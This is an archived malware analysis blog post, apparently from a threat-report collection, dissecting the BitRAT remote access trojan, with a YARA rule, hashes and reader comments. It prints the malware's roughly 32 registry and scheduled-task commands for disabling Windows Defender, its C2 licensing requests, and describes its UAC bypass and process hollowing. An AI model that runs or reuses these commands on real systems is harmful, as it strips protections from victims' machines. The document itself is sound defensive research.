{
    "id": "0e3e3ee3-1799-41ec-85eb-7a8559655533",
    "created_at": "2023-01-12T15:03:49.352884Z",
    "updated_at": "2025-03-27T02:05:54.109969Z",
    "deleted_at": null,
    "sha1_hash": "84e658df17d54e22f57559cd3cb079b8975ae486",
    "title": "2020-08-22 - BitRAT – The Latest in Copy-pasted Malware by Incompetent Developers",
    "authors": "",
    "file_creation_date": "2022-05-28T04:06:16Z",
    "file_modification_date": "2022-05-28T04:06:16Z",
    "file_size": 1890493,
    "plain_text": "# BitRAT – The Latest in C++ Malware Written by Incompetent Developers\n\n**[krabsonsecurity.com/2020/08/22/bitrat-the-latest-in-copy-pasted-malware-by-incompetent-developers/](https://krabsonsecurity.com/2020/08/22/bitrat-the-latest-in-copy-pasted-malware-by-incompetent-developers/)**\n\n[Posted on August 22, 2020](https://krabsonsecurity.com/2020/08/22/)\n\nTo yearn for an HVNC sample that is not ISFB or TinyNuke is a sure sign that you are reverse engineering too much malware.\n\n_– Me_\n\nI was recently made aware of a somewhat new malware being sold under the name “BitRAT” by the seller “UnknownProducts” on\nHackForums. As far as I know, there has been no public analysis of this malware yet. The seller’s comments indicate inexperience with\nmalware development, as demonstrated by him bragging about using Boost, OpenSSL, and LibCURL in his malware.\n\nThe screenshot provided was even more laughable, as we can see the developer used std::thread along with sleep_for. Given the heavy use\nof such libraries, the malware might as well be in Java. The naming convention is also inconsistent, mixing Hungarian notation (bOpen) with\nsnake_case (m_ssl_stream), with the latter name being copied from an open-source project.\n\n\n-----\n\nThe Tor binary is also dropped to disk, something which no competent malware developer would do. Anyways, enough about the author’s\nposts, let us move on to analyzing the files at hand. The goal of this analysis is to do the following:\n\nAnalyze the controller and see how it communicates with the developer’s server.\nBreak the various obfuscation and anti-analysis tricks used by BitRAT.\nAnalyze the behavior and functionality of the RATs and how some features are implemented.\nStudy the relationship between BitRAT and several other malware that it is related to.\n\n## The Controller\n\nIn this section, I’ll describe BitRAT’s licensing protocol and how the malware controller determines whether the person running it is a paying\ncustomer or not. The controller software is developed in .NET and is obfuscated with Eazfuscator. The version I have was compiled on the\n17th of August at 11:35:05 UTC.\n\nThe licensing protocol starts with the following HTTP request being sent:\n```\nGET /lic.php?h=HWID&t=unknown_value&s=unknown_value HTTP/1.1\nHost: unknownposdhmyrm.onion\nProxy-Connection: Keep-Alive\n\n```\nThe response is the following string, base64 encoded:\n```\nunknown_value|NO if not licensed, OK if licensed|0|1.26|1|base64_status_update_message||\n\n```\nIf there is no valid license associated with the HWID, the following 2 requests are made to create a purchase order:\n```\nGET /step_1.php?hwid=HWID&uniqueid=HWID&product_id=1 HTTP/1.1\nHost: unknownposdhmyrm.onion\nProxy-Connection: Keep-Alive\nGET /step_2.php?product_id=1&step=2&uniqueid=HWID HTTP/1.1\nHost: unknownposdhmyrm.onion\nProxy-Connection: Keep-Alive\n\n```\nIf you want to update your HWID, the following request is made\n```\nGET /hwid_update.php?hwid_old=[oldhwid]&hwid_new=[newhwid] HTTP/1.1\nHost: unknownposdhmyrm.onion\nProxy-Connection: Keep-Alive\n\n```\nThe payloads are built on the vendor’s server.\n```\nGET /client/clientcreate.php?\nhwid=hwid_here&type=standard&ip_address=google.com&tcp_main_port=3933&tcp_tor_service_port=0&install_folder=google&install_filename\n Host: unknownposdhmyrm.onion\nProxy-Connection: Keep-Alive\n\n```\nThe parameters are as follow:\n```\nhwid: self explanatory\ntype: \"standard\" or \"tor\"\nip_address: self explanatory\ntcp_main_port: self explanatory, 0 if tor\ntcp_tor_service_port: 80 if tor, 0 if standard\ninstall_folder and install_filename: self explanatory\npw_hash: MD5 hash of the selected communication password.\ntor prcname: name of the dropped tor exe binary 0 if standard\n\n```\n\n-----\n\ne se e u s pac e/ 9 (Ubu tu) a d as a d ecto y ca ed t co te ts u o\n\n## The Payload\n\nThe main sample that I will discuss is 7faef4d80d1100c3a233548473d4dd7d5bb570dd83e8d6e5faff509d6726baf2. It is written in Visual C++\nwith libraries including Boost, libCURL among other libraries. It was compiled with Visual Studio 2015 Build 14.0.24215 on the 14th of August\nat 01:32:11 UTC. The first part of the following section will discuss some of the obfuscation that BitRAT uses, the rest will focus on discussing\nthe behaviors and functionalities as well as how those are implemented.\n\n### String Pointers\n\nThe file for reasons that are initially unknown stores string pointers into an array instead of using them directly. This is dealt with rather easily\nusing an IDAPython script (attached at the end of the article).\n\nBefore (top) and after (bottom) renaming\n\n### Dynamic API\n\nSome APIs in the file are loaded dynamically. The code for loading this is quite strange. First, LoadLibraryA is resolved and some DLLs are\nloaded with it. Then, the author resolved GetProcAddress using GetProcAddress. This highly redundant code is something that no\nexperienced developer would write.\n\nThe APIs are then resolved. As we can see from the code the results are strangely not stored at times, for example, in this snippet\nWSACleanup is never stored anywhere. As was the case before, we dealt with this easily using IDAPython (the name for pmemset shown is\nautomatically generated).\n\nThe end of the function is also shrouded in mystery, with the UTF-8 strings for the DLL names being turned into wide-character strings on the\nheap and then finally returned.\n\n\n-----\n\nAll of these strange quirks didn’t make sense at first, but then it struck me that I’ve seen this done before: this very API loader is a complete\npaste from TinyNuke. Further examination confirmed this and that some function pointers are not saved due to compiler optimization.\nAnalyzing the code further, one could see that the entire HVNC/Remote Browser portion of BitRAT is a paste of TinyNuke with minimal\nmodification. We’ll go into more details of this in the later section covering the HVNC/Hidden Browser.\n\n### String Encryption\n\nStrings are encrypted at compile time using LeFF’s constexpr trick which is copied completely and unmodified. Strangely enough, Flare’s\nFLOSS tool does not work well on the payload for reasons unknown. As such, other less automated approaches are required for defeating\nthis obfuscation. For this part, I had the help of defcon42 who aided greatly in writing the IDAPython scripts.\n\nFirst, there are strings that are properly encrypted as LeFF intended.\n\nSecond, there are strings that MSVC for reasons unknown (read: being a bad compiler) didn’t perform constexpr evaluation on. For this, we\nused another script with another pattern.\n\nThird, there are strings for which the decryption function was not inlined (as developers who are well acquainted with MSVC would know,\n__forceinline is much more like __maybeinlineifyoufeellikeit. Perhaps MS should consider adding the keyword\n__actuallyinlinewhenforceinlineisused). This is often paired with the second variant of un-obfuscation. For this, we can hook the decryptor\nfunction (which are clustered together and easy to find manually) and dump the output and caller address.\n\n\n-----\n\nThere possibly are other patterns that are generated due to compiler optimization that was missed during this process. Since the developer\nso nicely made use of std::string and std::wstring, I also wrote up a quick hooking library to hook the constructor of std::string and std::wstring\nand log the string and return address.\n\nWith this, we likely have almost all of the strings that are used by BitRAT. There possibly are some strings left over that we didn’t identify, but\nfor the purpose of a preliminary static analysis, this is good enough.\n\n### Antidebug\n\nBitRAT uses NtSetInformationThread with ThreadHideFromDebugger for anti-debugging purposes.\n\n### Command Dispatcher\n\nThe command dispatcher takes the form of a switch-turned-into-jump-table.\n\nThe array has 0x88 elements, corresponding to 0x88 unique commands. Initially, I attempted the tedious work of identifying what each of\nthese commands semi-manually, but after working my way through around 30 commands I discovered a function (4D545D) where the list of\ncommand strings and their corresponding ID is built. The function takes the form of the following statement being repeated 0x88 times for\n\n\n-----\n\neac co a d\n\nBecause statically extracting this information would be extremely tedious as the compiler generates code that does not fall neatly into\npatterns, I dumped the table dynamically through hooking the create_command_entry function. The full table of commands and\ncorresponding ID is listed below:\n```\ncli_rc | 00\ncli_dc | 01\ncli_un | 02\ncli_sleep | 03\n[...] full list at https://gitlab.com/krabsonsecurity/bitrat/-/blob/master/command_list.txt\nhvnc_start_run | 84\nhvnc_start_ff | 85\nhvnc_start_chrome | 86\nhvnc_start_ie | 87\n\n```\nFollowing this, I’ll be discussing some of the most notable commands and features that the RAT has.\n\n### HVNC/Hidden Browser\n\nThe HVNC/Hidden Browser feature of this RAT is entirely copypasted from TinyNuke. The following functions from TinyNuke are present in\ntheir entirety:\n\nThe commands hvnc_start_explorer, hvnc_start_run, hvnc_start_ff, hvnc_start_chrome, hvnc_start_ie are simply copied from TinyNuke with\nminimal modifications. Below are two side-by-side comparisons of the code to show the level of copy-pasting I’m talking about. The top\nscreenshot is TinyNuke, the bottom is also TinyNuke but inside BitRAT.\n\n\n-----\n\nTinyNuke (top) and BitRAT (bottom)\n\n\n-----\n\nTinyNuke (top) and BitRAT (bottom)\n\nOne of the most obvious indicators of TinyNuke’s HVNC is the traffic header value “AVE_MARIA” which UnknownProducts did not change.\n\n\n-----\n\nTinyNuke (top) and BitRAT (bottom)\n\nThe HVNC client (located at data\\modules\\hvnc.exe) is also a complete rip-off of TinyNuke.\n\nBitRAT’s hvnc.exe file\n\n\n-----\n\nTinyNuke’s HVNC Server project\n\nBitRAT’s “hvnc.exe” file\n\n\n-----\n\nBitRAT’s “hvnc.exe” file\n\n### UAC Bypass\n\nThe UAC Bypass uses the fodhelper trick to elevate its privileges. The same code is embedded in multiple functions including the Windows\nDefender Killer code as well as the persistence code.\n\n### Windows Defender Killer\n\nArguably, this is the most laughable feature of the malware. The first few lines of assembly alone express the sheer absurdity of it.\n\nWinExec? Are we still living in 2006? The function is only around for compatibility with 16-bit Windows!\n\n\n-----\n\nBitRAT proceeds to run 32 different commands using WinExec to disable Windows Defender. They are as follow.\n```\n[esp] 0019F34C \"reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d \"0\" /f\"\n[esp] 0019F5F0 \"reg delete \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /f\"\n[esp] 0019FD3C \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v \\\"DisableAntiSpyware\\\" /t REG_DWORD /d \\\"1\\\"\n/f\"\n[esp] 0019FBDC \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v \\\"DisableAntiVirus\\\" /t REG_DWORD /d \\\"1\\\"\n/f\"\n[esp] 0019FCC8 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\\" /v \\\"MpEnablePus\\\" / t REG_DWORD /d\n\\\"0\\\" /f\"\n[esp] 0019F638 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v\n\\\"DisableBehaviorMonitoring\\\" /t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F6C4 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v\n\\\"DisableIOAVProtection\\\" /t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019FE24 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v\n\\\"DisableOnAccessProtection\\\" /t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F3B8 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v\n\\\"DisableRealtimeMonitoring\\\" /t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F2B8 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v\n\\\"DisableScanOnRealtimeEnable\\\" /t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F74C \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\\" /v \\\"DisableEnhancedNotifications\\\"\n/t REG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F444 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v \\\"DisableBlockAtFirstSeen\\\" /t\nREG_DWORD /d \\\"1\\\" /f\"\n[esp] 0019F880 \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v \\\"SpynetReporting\\\" /t REG_DWORD /d\n\\\"0\\\" /f\"\n[esp] 0019FA7C \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v \\\"SubmitSamplesConsent\\\" /t REG_DWORD\n/d \\\"2\\\" /f\"\n[esp] 0019FDAC \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger\\\" /v \\\"Start\\\" /t REG_DWORD\n/d \\\"0\\\" /f\"\n[esp] 0019FC4C \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger\\\" /v \\\"Start\\\" /t\nREG_DWORD /d \\\"0\\\" /f\"\n[esp] 0019F95C \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh\\\" /Disable\"\n[esp] 0019F4C4 \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\\" /Disable\"\n[esp] 0019FA18 \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\\" /Disable\"\n[esp] 0019F8F4 \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\\" /Disable\"\n[esp] 0019F52C \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\\" /Disable\"\n[esp] 0019F808 \"reg delete \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run\\\" /v\n\\\"SecurityHealth\\\" /f\"\n[esp] 0019F590 \"reg delete \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /v \\\"SecurityHealth\\\" /f\"\n[esp] 0019F7CC \"reg delete \\\"HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\"\n[esp] 0019FB98 \"reg delete \\\"HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\"\n[esp] 0019FAF4 \"reg delete \\\"HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\"\n[esp] 0019F9BC \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot\\\" /v \\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\"\n[esp] 0019F258 \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter\\\" /v \\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\"\n[esp] 0019F198 \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv\\\" /v \\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\"\n[esp] 0019F1F8 \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc\\\" /v \\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\"\n[esp] 0019FB34 \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend\\\" /v \\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\"\n[esp] 0019F34C \"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows Defender\\\\Features\\\" /v \\\"TamperProtection\\\" /t REG_DWORD /d \\\"0\\\"\n/f\"\n\n### Persistence\n\n```\nBitRAT uses the BreakOnTermination flag through the function RtlSetProcessIsCritical (48563B) to cause a bugcheck on termination of the\nprocess. This is done when the command line parameter -prs is present. In addition, it also attempts to elevate privileges using the fodhelper\nmethod whenever persistence is activated.\n\n### Webcam and Voice Recording\n\n[Both of these rely on open source libraries, OpenCV for webcam capture, and A. Riazi’s Voice Recording library with some debugging code](https://www.codeproject.com/Articles/10138/Voice-Recording-Playing-back-using-simple-classes)\nremoved.\n\n\n-----\n\n### Download and Execute\n\nUsually, I would not discuss such a trivial function, but the malware author managed to write this in a peculiarly terrible way. There are\nbasically two different methods of downloading: the first performs the typical URLDownloadToFile + ShellExecute combo.\n\nThe peculiarity lies in the second execution path. Here, the developer opted to use libcurl to download the file to memory and then uses\nprocess hollowing/runPE to execute it.\n\n\n-----\n\nThe code is rather clearly copy-pasted, given the use of the default libcurl useragent. In addition, the process hollowing code used was one\nyou would expect to see in 2008 crypters, not 2020 malware.\n\n\n-----\n\n### BSOD Generator\n\nLike the function above, it is also rather trivial and I usually would not bother discussing this. However, even this was completely copy-pasted\nfrom StackOverflow.\n\n\n-----\n\n[https://stackoverflow.com/questions/7034592/create-bsod-from-user-mode/41170796](https://stackoverflow.com/questions/7034592/create-bsod-from-user-mode/41170796)\n\n### Configuration\n\nThe configuration is edited into the file post-compilation by replacing two strings in the binary. The first string (offset 004C9C68) contains the\nencrypted configuration information, and the second string (offset 004C9E6C) contains part of what will become the decryption key.\n\nFirst (004E1694), the encryption key is concatenated with the string “s0lmYr” (we will discuss this further in the next section).\n\nThen (4E16AA), the result is MD5 hashed and truncated down to 16 characters (4E16B8).\n\nFinally (004E16FE), the key is used to decrypt the configuration block. The decryption function uses a class called “Enc”, which is a wrapper\n[around an open source implementation of the Camellia encryption algorithm. Decrypting the configuration of the sample in question](https://github.com/calccrypto/Encryptions/blob/master/Encryptions/Camellia.cpp)\n(68ac9b8a92005de3a7fe840ad07ec9adf84ed732c4c6a19ee2f205cdbda82b9a4a05ae3d416a39aaf5c598d75bf6c0de00450603400f480879941df\nwith the key we generated (ac4016133b9d18e2), we get the final configuration data, which is as follow:\n\n\n-----\n\n```\n Broker|\n\n```\nWe can from this infer that the format is:\n```\nhostname|non-tor port|tor port|unknown value|installation folder|installation name|md5 of communication password|tor process name\n\n```\nThe unknown value is unique across builds including builds from the same customer. It is possibly used by the malware author to track builds\ngenerated by customers but we can’t say much without guessing.\n\n### Possible Link to Warzone RAT\n\nRecall the string that was concatenated to generate the key for decrypting the configuration.\n\nAs we know, Solmyr is the developer of Warzone, another RAT on HF. The features of the two RATs are somewhat similar, and both are copypasted from TinyNuke (Version 1.2 and up of Warzone had the string “AVE_MARIA” from the same stolen code leading incompetent reverse\n[engineers at “threat intelligence” companies [1][2][3][4] to calling it “Ave Maria stealer/RAT” because they couldn’t figure out that this is just](https://blog.morphisec.com/threat-alert-ave-maria-infostealer-on-the-rise-with-new-stealthier-delivery)\nTinyNuke’s Hidden VNC).\n\nHowever, there are a wide variety of differences that indicate that the two are not developed by the same person. First of all, the coding styles\nof the two are significantly different, Warzone was for the most part lightweight while BitRAT is heavily bloated. The portion of TinyNuke that\nwas copy-pasted is slightly different as well, with BitRAT utilizing the API loading mechanism while Warzone used the regular import table and\nslightly modified the code as well. Below is the comparison of ConnectServer in the two RATs.\n\nBitRAT\n\n\n-----\n\nWarzone\n\nMany functionalities are also implemented differently. For example, BitRAT uses SetWindowsHookExW(WH_KEYBOARD_LL) to perform\nkeylogging (004AFD7A), while Warzone uses a Window callback and GetRawInputData to achieve this purpose.\n\nUnknownProducts, the developer of BitRAT, was a customer of Warzone at one point.\n\n\n-----\n\nt s poss b e t at t e de e ope s o t e t o a a e a e so e o o code s a g o co t actua e at o s p o e e, as t e e s ot\nmuch public information available regarding the relationship between the two developers, we could only speculate as to why “s0lmYr” was\npresent as a key in BitRAT.\n\n## Final Thoughts and Notes\n\nAs is the case with most HF malware, BitRAT is best described as an amalgamation of poorly pasted leaked source code slapped together\nalongside a fancy C# GUI. It makes heavy uses of libraries such as C++ Standard Library, Boost, OpenCV, and libcurl, as well as code copied\ndirectly from leaked malware source code or sites including StackOverflow. The choice of Camellia is somewhat unique, I have not seen this\nspecific algorithm used in malware before.\n\nIn marketing the malware, the author makes multiple false claims. He asserted that the malware is “Fully Unicode compatible” while the\nTinyNuke code used ANSI APIs, he claimed the persistence is “impossible to kill” when in reality BreakOnTermination doesn’t make the\nprocess impossible to terminate and can be easily unset the same way it was set. Features such as the Windows Defender killer are terribly\ndone and would catch the eye of anyone monitoring the system, and last but not least, the claim that the developer “[didn’t] copy anything” is\nmost patently untrue, thankfully we “skilled reverse engineers” did in fact “compare signatures and generic behavior”. It is disappointing how\neasy it is for anyone with minimal programming experience can whip up a quick malware and make a profit harming others.\n\n### YARA Rule\n```\nrule BitRATStringBased\n{\n  meta:\n    author = \"KrabsOnSecurity\"\n    date = \"2020-8-22\"\n    description = \"String-based rule for detecting BitRAT malware payload\"\n  strings:\n    $tinynuke_paste1 = \"TaskbarGlomLevel\"\n    $tinynuke_paste2 = \"profiles.ini\"\n    $tinynuke_paste3 = \"RtlCreateUserThread\"\n    $tinynuke_paste4 = \"127.0.0.1\"\n    $tinynuke_paste5 = \"Shell_TrayWnd\"\n    $tinynuke_paste6 = \"cmd.exe /c start \"\n    $tinynuke_paste7 = \"nss3.dll\"\n    $tinynuke_paste8 = \"IsRelative=\"\n    $tinynuke_paste9 = \"-no-remote -profile \"\n    $tinynuke_paste10 = \"AVE_MARIA\"\n    $commandline1 = \"-prs\" wide\n    $commandline2 = \"-wdkill\" wide\n    $commandline3 = \"-uac\" wide\n    $commandline4 = \"-fwa\" wide\n  condition:\n    (8 of ($tinynuke_paste*)) and (3 of ($commandline*))\n}\n\n Hashes\n\n```\n7faef4d80d1100c3a233548473d4dd7d5bb570dd83e8d6e5faff509d6726baf2 (I’ve uploaded this to VirusBay, if you have access to\nneither VT and VB feel free to message me on Twitter and I’ll share the file.)\n278e32f0a92deca14b2a1c2c7984ebf505bbe8337d31440b7f1d239466f4bb74\n495bf0fc6abef22302d9ac4c66017fc6c7b767b32746db296ac8d25e77e28906\nd0abc08b50b1285f484832548dab453203f9b654e2a36c1675d3a9e835419ff4\neb82628a61e11bf8a91a687ce55a4615ef3d744635a864aefa7e79c8091ce55c\ne7860957e268e4cdb8b63a3cf81f450cbfbb31d1cf78e6cc11f6f15cb157b409\n\n### Network Indicators\n\nTLS certificate with subject matching issuer and CN=BitRAT.\nTor traffic.\nUser-agent: “libcurl-agent/1.0” (though this would also be present in some legitimate traffic).\n\n### Tools\n\nI’ve published the source code of several scripts and tools I made during the process of reverse engineering. I’ve only published one of the\n[string decryption scripts because the rest are rather unfinished and unreliable. The command hook tool uses the Subhook library.](https://github.com/Zeex/subhook) You can\nview the code on Gitlab.\n\n### Comments ( 14 )\n\n\n-----\n\n_o_ _a Use_ osted o p ugust, 0 0\nHi, Great Post What is your suggestion for learning \"Reverse Engineering New/obfuscated Malwares\"? I've read \"Practical Malware\nAnalysis\". Do you have any another suggestions? (Book/Tutorial/Video)\n\n_Mr. KrabsPosted on 7:40 pm August 22, 2020_\nI started out a long time ago with Lena's Tuts (not malware specific and somewhat outdated). PMA is good from what I heard, I\ndon't have any book recommendations but the most important part of learning is still learning by doing, keep downloading samples\nfrom public sandboxes and write about them.\n\n2. GuyfawkesPosted on 9:21 pm August 22, 2020\n\nLooks like BitRAT UI is coded in VB.NET, but not C#. Doesn't seem as if the UI is copy 'n pasted looking at how it uses virtual objects for\nlistview, etc. I mean it seems really unique. Having had a look at most public .NET sources, which RAT is it based on?\n\n_KrabsOnSecurityPosted on 4:32 am August 23, 2020_\nAnd the UI happens to be the thing that no one cares about when reverse engineering malware, as it turns out.\n\n3. DanyPosted on 11:59 am August 23, 2020\n\nThat thing you mention in the beginning about \"m_ssl_stream\" is a widely used term based off Boost ASIO documentation and\nrepeatedly used by Microsoft in their examples on github. From the picture over the code showing the usage of \"m_ssl_stream\" it looks\nunique and I can't seem to find from where that would have copied. I have to give credits to Unknown for their work even though some\nsnippets may/were copied/pasted here and there. Overall Bitrat seems like a robust RAT and unline other RATS it's very fascinating that\nnot a single complaint has appeared anywhere yet.\n\n4. TheodorePosted on 10:28 pm August 23, 2020\n\nDid you offer free malware reverse engineering service on HF with sticky paid thread? Lol. How dare you!\n\n5. Rennie AllenPosted on 8:07 pm August 24, 2020\n\nAs agent 86 would say: \"of course, the old GetProcAddress with GetProcAddress trick\".\n\n6. Sean connerPosted on 12:06 am September 3, 2020\n\nlmao https://i.imgur.com/KtifF16.png\n\n7. Werner HaasPosted on 9:02 pm September 7, 2020\n\nI am curious about WinExec: couldn't it be that the deprecated function was used on purpose because people tend to forget old stuff? I\ncould imagine such a simple thing being sufficient for flying under the radar of sandboxes from equally incompetent developers.\n\n_KrabsOnSecurityPosted on 3:03 pm September 9, 2020_\nIt wouldn't change a thing, WinExec just calls CreateProcessA internally, and for monitoring processes people use kernel\ncallbacks anyways so the API of choice does not matter. https://share.riseup.net/#SX2q4dDzHTQK0-RTsAhpAQ\n\n8. rambouPosted on 10:12 am October 8, 2020\n\nAmazing post. I wanted to write an analysis for that 11 years ago. These Sk1ds calls themselves devs/hackers in HF while they are\nexperts in C&P stuff they find around the net which clearly don't understand how those work. You nailed it, man!\n\n9. cellPosted on 7:33 am December 18, 2020\n\nlol\n\n10. TestPosted on 7:51 am December 17, 2021\n\nBitRat also seems to be backdoored: https://github.com/miketestz/BitRAT_is_Thief\n\n11. DanPosted on 2:40 pm February 15, 2022\n\nYour work is great, but the whole \"no experienced developer would do this, this developer sucks\" schtick is lame, just makes you sound\narrogant. You come across as one of those \"nobody does anything right except me\" people that can make working in software kind of\nshitty if you're unfortunate enough to have to work closely with them. Otherwise awesome job.\n\nView Comments (14) ...\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-22 - BitRAT – The Latest in Copy-pasted Malware by Incompetent Developers.pdf"
    ],
    "report_names": [
        "2020-08-22 - BitRAT – The Latest in Copy-pasted Malware by Incompetent Developers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535829,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653710776,
    "ts_modification_date": 1653710776,
    "files": {
        "pdf": "https://archive.orkl.eu/84e658df17d54e22f57559cd3cb079b8975ae486.pdf",
        "text": "https://archive.orkl.eu/84e658df17d54e22f57559cd3cb079b8975ae486.txt",
        "img": "https://archive.orkl.eu/84e658df17d54e22f57559cd3cb079b8975ae486.jpg"
    }
}